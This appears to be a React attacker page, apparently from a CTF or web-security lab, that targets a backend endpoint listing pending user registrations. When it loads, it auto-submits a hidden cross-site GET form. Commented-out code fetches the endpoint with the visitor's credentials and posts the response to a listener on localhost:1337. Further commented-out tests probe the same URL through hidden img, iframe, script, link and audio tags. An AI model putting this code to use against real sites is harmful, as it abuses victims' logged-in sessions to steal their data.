import React, { useEffect, useState, useRef } from 'react';

function App() {
  const submitButtonRef = useRef(null);

  useEffect(() => {
    // Automatically click the submit button when the component mounts
    if (submitButtonRef.current) {
      submitButtonRef.current.click();
    }
    // fetchData()
  }, []); 

  // const fetchData = async () => {
  //   try {
  //     const response = await fetch(`https://backend.example.com/users/pendingRegistration`, { 
  //                                   method: "GET",
  //                                   credentials: 'include' 
  //                                 });
  //     const data = await response.text(); // Otteniamo la risposta come testo
  //     console.log(data)
  //     await fetch('http://localhost:1337',{method:'POST',body:data})
  //     // setError(null); // Reimposta lo stato di errore se la richiesta Ã¨ andata a buon fine
  //   } catch (error) {
  //     console.error('Error:', error);
  //     // setError('Error fetching data'); // Imposta lo stato di errore
  //   }
  // };

  return (
    <div className="App d-flex justify-content-center align-items-center" style={{ backgroundColor: '#2c2c2c', minHeight: '100vh' }}>
      <header className="App-header">
       <div className="container">
           <div className="row justify-content-center">
             <div className="col-md-6 text-center">
              <form action="http://backend.example.com/users/pendingRegistration" method="GET">
              <button 
                  type="submit" hidden
                  className="btn btn-dark btn-lg mt-3"
                  ref={submitButtonRef}
                >
                  Submit
              </button>
              </form>
              {/* <img 
              src="https://backend.example.com/users/pendingRegistration" 
              alt="Test Image" 
              style={{ display: 'none' }}
              onError={(e) => console.log('Image load error:', e)}
              onLoad={() => console.log('Image loaded successfully')}
            /> */}

            {/* Test con iframe */}
            {/* <iframe 
              src="https://backend.example.com/users/pendingRegistration" 
              style={{ display: 'none' }}
              onLoad={() => console.log('iframe loaded')}
            ></iframe> */}

            {/* Test con script
            <script 
              src="https://backend.example.com/users/pendingRegistration" 
              onError={(e) => console.log('Script load error:', e)}
              onLoad={() => console.log('Script loaded successfully')}
            ></script> */}

            {/* Test con link (CSS) */}
            {/* <link 
              rel="stylesheet" 
              href="https://backend.example.com/users/pendingRegistration" 
              onError={(e) => console.log('CSS load error:', e)}
              onLoad={() => console.log('CSS loaded successfully')}
            /> */}

            {/* Test con audio */}
            {/* <audio 
              src="https://backend.example.com/users/pendingRegistration" 
              style={{ display: 'none' }}
              onError={(e) => console.log('Audio load error:', e)}
              onCanPlay={() => console.log('Audio can play')}
            ></audio> */}

               
             </div>
           </div>        
         </div>
       </header>
     </div>
    
  );
}

export default App;